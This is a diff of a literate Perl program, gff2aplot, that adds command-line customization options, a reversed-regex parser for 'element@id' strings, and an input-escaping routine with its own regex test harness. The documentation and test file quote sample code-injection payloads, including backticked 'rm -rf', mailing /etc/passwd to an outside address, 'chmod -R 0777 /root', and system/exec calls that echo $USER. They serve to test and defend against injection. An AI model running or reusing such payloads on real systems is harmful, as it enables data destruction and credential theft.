@@ -4,7 +4,7 @@
 %2345678901234567890123456789012345678901234567890123456789012345678901234567890
 %        1         2         3         4         5         6         7         8
 %
-% $Id: gff2aplot.nw,v 1.5 2001-08-27 17:47:43 jabril Exp $
+% $Id: gff2aplot.nw,v 1.6 2001-08-29 15:12:07 jabril Exp $
 %
 \usepackage{noweb,multicol}
 \usepackage[a4paper,offset={0pt,0pt},hmargin={2cm,2cm},vmargin={1cm,1cm}]{geometry}
@@ -70,7 +70,7 @@
 %%} % parbox
 %%\end{center}
 %%\end{abstract}\vskip 5ex
-%%{\large$<$ \verb$Id: gff2aplot.nw,v 1.5 2001-08-27 17:47:43 jabril Exp $$>$ }
+%%{\large$<$ \verb$Id: gff2aplot.nw,v 1.6 2001-08-29 15:12:07 jabril Exp $$>$ }
 %%
 %%\vfill
 %%
@@ -400,9 +400,9 @@ Some info about the program itself.
 <<Global Constants>>=
 my ($PROGRAM,$VERSION,$REVISION,$REVISION_DATE,$LAST_UPDATE) = 
    ( 'gff2aplot','v2.0',
-     '$Revision: 1.5 $', #'
-     '$Date: 2001-08-27 17:47:43 $', #'
-     '$Id: gff2aplot.nw,v 1.5 2001-08-27 17:47:43 jabril Exp $', #'
+     '$Revision: 1.6 $', #'
+     '$Date: 2001-08-29 15:12:07 $', #'
+     '$Id: gff2aplot.nw,v 1.6 2001-08-29 15:12:07 jabril Exp $', #'
     );
 $REVISION =~ s/\$//og;
 $REVISION_DATE =~ s/\$//og;
@@ -615,7 +615,7 @@ sub parse_command_line() {
 
     &set_custom_files();
 
-    <<Check command-line options>>
+    &check_command_line_vars();
 
     &footer("COMMAND-LINE CHECKED");
 } # parse_command_line
@@ -810,9 +810,16 @@ defined($chk_stdin) && do {
 \todo{
 \item [[<<Check command-line options>>]]
 } % todo
-<<Check command-line options>>=
-#
+<<Parsing Command-Line Options>>=
+sub check_command_line_vars() {
+    &report("CHECKING_CMDLN_VARS");
+} # check_command_line
 @
+
+<<messages - input/output>>=
+CHECKING_CMDLN_VARS =>
+  $sp."### Checking COMMAND-LINE Settings\n".$sp,
+@ 
 
 \subsubsctn{Loading GFF elements custom variables from command-line}
 
@@ -820,8 +827,58 @@ defined($chk_stdin) && do {
 \item Parsing and loading command-line options having structure like:\\
 \centerline{[[--feature feature_name::variable_name=value]]}
 } % todo
-<<Check command-line options>>=
+<<Parsing Command-Line Options>>=
 #
+@
+
+<<command-line options custom>>=
+"feature-var=s@"  => \@{ $CmdLineVars{VARS}{FEATURE} },
+"group-var=s@"    => \@{ $CmdLineVars{VARS}{GROUP} },
+"strand-var=s@"   => \@{ $CmdLineVars{VARS}{STRAND} },
+"source-var=s@"   => \@{ $CmdLineVars{VARS}{SOURCE} },
+"sequence-var=s@" => \@{ $CmdLineVars{VARS}{SEQUENCE} },
+"layout-var=s@"   => \@{ $CmdLineVars{VARS}{LAYOUT} },
+@ 
+<<command-line help custom>>=
+ --feature-var '<feature::variable=value>'
+   --group-var '<group::variable=value>'
+  --strand-var '<strand::variable=value>' 
+  --source-var '<source::variable=value>'
+--sequence-var '<sequence::variable=value>'
+  --layout-var '<variable=value>'
+         Loading a feature/group/strand/source/sequence/layout
+         customization variable from command-line. You can set
+         several variables by repeating any of these options, 
+         i.e.:
+... --feature-var cds::shape=box --feature-var cds::feature_color=blue ... 
+@
+<<HIDE: command-line latex short custom>>=
+\rw{-\/-feature-var '\pr{feature::variable=value}'}
+  {Set a feature customization variable from command-line.}
+\rw{-\/-group-var '\pr{group::variable=value}'}
+  {Set a group customization variable from command-line.}
+\rw{-\/-strand-var '\pr{strand::variable=value}'}
+  {Set a strand customization variable from command-line.}
+\rw{-\/-source-var '\pr{source::variable=value}'}
+  {Set a source customization variable from command-line.}
+\rw{-\/-sequence-var '\pr{sequence::variable=value}'}
+  {Set a sequence customization variable from command-line.}
+\rw{-\/-layout-var '\pr{variable=value}'}
+  {Set a layout customization variable from command-line.}
+@ 
+<<HIDE: command-line latex custom>>=
+\clmitem{-\/-feature-var '\pr{feature::variable=value}'}
+Loading a customization variable for a GFF feature element from command-line. % '\pr{custom\_file}'. 
+\clmitem{-\/-group-var '\pr{group::variable=value}'}
+Loading a customization variable for a GFF group element from command-line. % '\pr{custom\_file}'. 
+\clmitem{-\/-strand-var '\pr{strand::variable=value}'}
+Loading a customization variable for a GFF strand element from command-line. % '\pr{custom\_file}'. 
+\clmitem{-\/-source-var '\pr{source::variable=value}'}
+Loading a customization variable for a GFF source element from command-line. % '\pr{custom\_file}'. 
+\clmitem{-\/-sequence-var '\pr{sequence::variable=value}'}
+Loading a customization variable for a GFF sequence element from command-line. % '\pr{custom\_file}'. 
+\clmitem{-\/-layout-var '\pr{variable=value}'}
+Loading a customization variable for page layout from command-line. % '\pr{custom\_file}'. 
 @
 
 \subsctn{Setting customization parameters from files} 
@@ -1006,11 +1063,14 @@ sub varscheck() {
         (&warn('VAR_NOT_DEFINED',$F,$class,$$rec[1]),return $F);
     &checkvarvalues($_var->{$$rec[1]}{'TYPE'},\$$rec[2],$$rec[1]) || return $F;
     $flag && do {
+        my @tmpary = ();
         defined(@{ $CustomVars{$class}{$$rec[1]} }) || do {
             @{ $CustomVars{$class}{$$rec[1]} } = ();
         };
+        @tmpary = &find_regexp($$rec[0]);
+        (shift @tmpary) || return $F;
         push @{ $CustomVars{$class}{$$rec[1]} }, 
-             ( &find_regexp($$rec[0]), $$rec[2] );
+             ( @tmpary, $$rec[2] );
         return $T;
 	};
     $CustomVars{$class}{$$rec[1]} = $$rec[2];
@@ -1068,53 +1128,241 @@ that we do not need to introduce a new field in the array.
 <<Parsing Custom Files>>=
 sub find_regexp() {
     my $string = $_[0];
-    my ($not_flg, $id_flg, $regexp_flg, $new_string, $tmpstr, $tmpid);
-    $not_flg = $regexp_flg = $F;
-    $id_flg = $NULL;
-    $string =~ s/^!//o && ($not_flg = $T); # not_regexp is true
-    <<does string contain a regular expression>>
-    $regexp_flg || $new_string = '^'.$string.'$'; #'
-    return ($not_flg, $id_flg, $new_string);
+    my ($isOK_flg,$not_flg,$id_flg,$tmpstr,$tmpid);
+    $isOK_flg = $T;
+    $not_flg = $F;
+    $id_flg = undef;
+    $string =~ s{^!}{}o && ($not_flg = $T); # not_regexp is true
+    $string =~ s{(\\@)$}{@@}o; # scaping trailing '@' (if element ends with) 
+    $string = &escape_input($string);
+    ($tmpstr, $tmpid) = (undef, undef);
+    ( reverse($string) =~ m{^([^\/@]*?)(?:@){1}(.*)$}o ) && do {
+        $tmpstr = reverse($2);
+        $tmpid  = reverse($1);
+    }; # reverse($string)
+    (defined($tmpid)  && $tmpid  ne "") && ($id_flg = $tmpid);
+    (defined($tmpstr) && $tmpstr ne "") || do {
+        $string eq '@' && ($isOK_flg = $F);
+        $tmpstr = $string;
+    }; # (defined($tmpstr) && $tmpstr ne "")
+  REGEXPS: {
+      <<does string contain a regular expression>>
+    }; # REGEXPS
+    $isOK_flg && do {
+        eval { "" =~ m{$string}; } || do {
+            $isOK_flg = $F;
+        }; # check if final regexp string is OK
+    }; # $isOK_flg
+    $isOK_flg || do {
+        &warn('BAD_REGEXP',$F,"$string");
+        $string = "";
+    }; # NOT $isOK_flg
+    return ($isOK_flg, $not_flg, $id_flg, $string);
 } # find_regexp
 @
 
-<<Global Constants>>= 
-$NULL = '+@+NULL+@+';
-@ 
+<<warnings - parsing custom files>>=
+BAD_REGEXP =>
+  $Warn."Ill-formed regular expression found in custom file:\n".
+  $spw." ---> \%s <---\n",
+@
 
-Two steps are needed for parsing element fields. We must ensure first that there is an [[@id]] feature delimiter in the element field and, after removing that delimiter, check if we have a regular expression or not.  
+Two steps are needed for parsing element fields. We must ensure first
+that there is an [[@id]] feature delimiter in the element field and,
+after removing that delimiter, check if we have a regular expression
+or not. The easiest way to extract any trailing 'id' substring from
+element field is using a sexeger, a reversed regular expression
+\footnote{Further information on sexeger (reversed regexes) can be
+found at \url|http://www.perl.com/pub/2001/05/01/expressions.html| and
+\url|http://www.pobox.com/~japhy/|.}
 
 <<does string contain a regular expression>>=
-$string =~ /^(.*)(?:@(.*?))?$/ && (($tmpstr, $tmpid) = ($1,$2));
-
+$tmpstr eq '*' && do {
+    $string = '^.*$'; #'
+    last REGEXPS;
+}; # $string eq '*'
+$tmpstr =~ m{^/(.*)/$}o && do {    
+    ($string, $isOK_flg) = &eval_regexp($1);
+    last REGEXPS;
+}; # $tmpstr is a regexp
+# ($tmpstr =~ m{^/.*[^/]$}o || $tmpstr =~ m{^[^/].*/$}o) && do {
+#     $isOK_flg = $F;  
+#     last REGEXPS;
+# }; # $tmpstr is a bad defined regexp
+$string = '^'.(quotemeta($tmpstr)).'$'; #' 
 @ 
 
 <<HIDE: testing regular expressions for element@id>>=
-As we can see in the perl script below, reversing the regular expression is a good choice. Further information on sexeger (reversed regexes) can be found at \url|http://www.perl.com/pub/2001/05/01/expressions.html| and \url|http://www.pobox.com/~japhy/|.
+The following does not work pretty well:
+
+$string =~ /^(.*)(?:@(.*?))?$/ && (($tmpstr, $tmpid) = ($1,$2));
+
+As we can see in the perl script below, reversing the regular expression is a good choice: 
 
 perl -ne ' 
     chomp;
     $a=$b=undef;
-    (reverse($_) =~ /^([^\/]*?)(?:\@)(.*)$/o) && 
+    (reverse($_) =~ /^([^\/]*?)(?:\@)(?!\\)(.*)$/o) && 
         ($a=reverse($2),$b=reverse($1));
     defined($b) && 
         (print ">>> \"$a\" \@ \"".($b?$b:"NIL")."\"\n") ||
             (print ">>> \"$_\"\n"); '
-
-jhkjfhgkjdf@one
+jhkjfhgkjdf@one # feature string and ID, both defined
 >>> "jhkjfhgkjdf" @ "one"
-/.*@@.*/
+/.*@@.*/        # only feature regexp, no ID
 >>> "/.*@@.*/"
-ffgdg
+ffgdg           # only feature string, no ID
 >>> "ffgdg"
-jhkjfhgkjdf@
+jhkjfhgkjdf@    # only feature string, but an empty ID field ? 
 >>> "jhkjfhgkjdf" @ "NIL"
-/.*@@.*/@kk
+jhkjfhgkjdf\@   # use "\" to preserve "@" if feat ends with "@" (most unlikely)
+>>> "jhkjfhgkjdf\@"
+/.*@@.*/@kk     # feature regexp and ID, both defined
 >>> "/.*@@.*/" @ "kk"
-*@yoyo
+*@yoyo          # feature pseudo-regexp ("*" ~ "/.*/") and ID, both defined
 >>> "*" @ "yoyo"
-!@@@@@lio
+!@@@@@lio       # a very extrange test, isn't it ? ... ;^D
 >>> "!@@@@" @ "lio"
+@ 
+
+<<Parsing Custom Files>>=
+sub eval_regexp() {
+    my $str = $_[0];
+    my $flag;
+    eval { "" =~ m{$str}; $flag = $T; } || ($flag = $F);
+    return ($str, $flag);
+} # eval_regexp
+@ 
+
+From a list of possible tainted shell metacharacters, [[ ; < > * | & $ ! ? # ( ) [ ] { } : ` ' " \ ]], % # @_ =~ s/([;<>\*\|`&\$!?#\(\)\[\]\{\}:'"\\])/\\$1/g;
+we quote those that are not going to be used as regular expression metacharacters, [[ ; < > & ! { } ` ' " ]], to avoid security issues. This will make a CGI developed on {\prog} a little bit more secure because the user cannot send something like:\\
+\centerline{\shortstack{[[//; `/bin/rm -rf`;//]]\ \ ,\\[[/ @{[ system('mail user@server /etc/passwd') ]} /]]\\or\\[[/ ${ \( exec('chmod -R 0777 /root') ) } /]]}} %$
+
+<<Parsing Custom Files>>=
+sub escape_input() {
+    my $var = $_[0];
+    $var =~ s{([;,<>&!\{\}`'"])}{\\$1}g;
+    return $var;
+} # escape_input
+@ 
+
+<<HIDE: testing regexes: regexptester.pl>>=
+BEGIN { ($NULL,$T,$F) = ("+@+NULL+@+",1,0); }
+    chomp;
+    s{^:::\s+}{}o;
+    print ">>> $_ \n";
+    ($a,$b) = split /\s+:::\s+/o, $_, 2;
+    @results = &find_regexp($a);
+    @results_mod = (($results[0] ? "TRUE" : "FALSE"),
+                    ($results[1] ? "TRUE" : "FALSE"),
+                    (defined($results[2]) ? $results[2] : "FALSE"),
+                    "$results[3]");
+    printf ">>> IS_OK::%s::  IS_NEG::%s::  GET_ID::%s::  GET_STRING::%s::\n",
+           @results_mod;
+    !$results[1] &&
+         print ">>> ".
+             (  ( (eval { $b =~ m{$results[3]}; 1 } || 0) ?
+                         ($b =~ m{$results[3]}) : 0 ) ? 
+                     "\"$b\" MATCHES \/$results[3]\/ " : 
+                     "\"$b\" DOES NOT MATCH \/$results[3]\/ ")."\n\n";
+    $results[1] &&
+         print ">>> ".
+             (!(( (eval { $b =~ m{$results[3]}; 1 } || 0) ?
+                         ($b =~ m{$results[3]}) : 0 )) ? 
+                       "\"$b\"  MATCHES !\/$results[3]\/ " : 
+                       "\"$b\" DOES NOT MATCH !\/$results[3]\/ ")."\n\n";
+sub find_regexp() {
+    my $string = $_[0];
+    my ($isOK_flg,$not_flg,$id_flg,$tmpstr,$tmpid);
+    $isOK_flg = $T;
+    $not_flg = $F;
+    $id_flg = undef;
+    $string =~ s{^!}{}o && ($not_flg = $T); # not_regexp is true
+    $string =~ s{(\\@)$}{@@}o;
+    $string = &escape_input($string);
+    ($tmpstr, $tmpid) = (undef, undef);
+    ( reverse($string) =~ m{^([^\/@]*?)(?:@){1}(.*)$}o ) && do {
+        $tmpstr = reverse($2);
+        $tmpid  = reverse($1);
+    };
+  REGEXPS: {
+      print ">>> STRING($tmpstr) ID($tmpid)\n";
+      (defined($tmpid) && $tmpid ne "") && ($id_flg = $tmpid);
+      (defined($tmpstr) && $tmpstr ne "") || do {
+          $string eq '@' && ($string="", $isOK_flg=$F);
+          $tmpstr = $string;
+      };
+      $tmpstr eq '*' && do {
+          $string = '^.*$';
+          last REGEXPS;
+      };
+      $tmpstr =~ m{^/(.*)/$}o && do {    
+          ($string, $isOK_flg) = &eval_regexp($1);
+          last REGEXPS;
+      }; # $tmpstr is a regexp
+      $string = '^'.(quotemeta($tmpstr)).'$';
+    }; # REGEXPS
+    return ($isOK_flg, $not_flg, $id_flg, $string);
+} # find_regexp
+sub eval_regexp() {
+    my $str = $_[0];
+    my $flag;
+    # $str =~ s{^[^\\]*?/+}{}o;
+    # $str =~ s{/+.*?$}{}o;
+    eval { "" =~ m{$str}; $flag = $T; } || ($flag = $F);
+    return ($str, $flag);
+} # eval_regexp
+sub escape_input() {
+  $_[0] =~ s{([;<>&!{}'`"])}{\\$1}og;
+  return $_[0];
+} # escape_input
+@
+
+<<HIDE: testing regexes: regexes.test>>=
+::: @ ::: @
+::: \@ ::: @
+::: @@ ::: @
+::: element ::: element
+::: element ::: any
+::: !element ::: element
+::: !element ::: any
+::: element@id ::: element
+::: !element@id ::: element
+::: /.*any.*/ ::: chooseanyfeat
+::: /; system(" echo \"I have found your name: \$USER ... X.D\" "); / ::: any
+::: /; `echo "I have found your name: \$USER ... X.D"`; / ::: any
+::: / @{[ system("echo \"I have found your name: \$USER ... X.D\"") ]} / ::: any
+::: / @{[ system('echo "I have found your name: $USER ... X.D"') ]} / ::: any
+::: / @{ \( system("echo \"I have found your name: \$USER ... X.D\"") ) } / ::: any
+::: / @{ \( exec "echo \"I have found your name: \$USER ... X.D\"" ) } / ::: any
+::: /(a)+ny/ ::: any
+::: /(a)+ny/ ::: aany
+::: /^(a)+ny/ ::: any
+::: /^a?ny/ ::: any
+::: /^a?ny/ ::: aany
+::: /^a?ny/@id ::: any
+::: /^a?ny/@id ::: onyony
+::: /^a?ny/@id ::: nyony
+::: !/^a?ny/ ::: any
+::: !/^a?ny/ ::: aany
+::: !/^a?ny/ ::: ony
+::: 5'cds ::: 5'cds
+::: /^5'.*$/ ::: 5'utr
+::: /^a.*?y$/ ::: annnnny
+::: /^a.*?y$/ ::: anyany
+::: /^a[^y]*y$/ ::: annnnny
+::: /^a[^y]*y$/ ::: anyany
+::: /a.+?y/ ::: annnnny
+::: /a.+?y/ ::: ayyyyyy
+::: /y{6}/ ::: ayyyyyy
+@
+
+<<HIDE: test file for the previous regexp tester>>=
+notangle -L -R'HIDE: testing regexes: regexptester.pl' $WORK/$nwfile.nw | \
+         cpif $BIN/regexptester.pl ;
+notangle -R'HIDE: testing regexes: regexes.test' $WORK/$nwfile.nw | \
+         cpif $TEST/regexes.test ;
+perl -n $BIN/regexptester.pl < $TEST/regexes.test > $TEST/regexes.report ;
 @ 
 
 \subsctn{Customization variable values validation}
@@ -5070,7 +5318,7 @@ exit 0
 This document is under Revision Control System (RCS). The version you are currently reading is the following:
 
 <<Version Control Id Tag>>=
-# $Id: gff2aplot.nw,v 1.5 2001-08-27 17:47:43 jabril Exp $
+# $Id: gff2aplot.nw,v 1.6 2001-08-29 15:12:07 jabril Exp $
 @ 
 
 \subsctn{GNU General Public License}
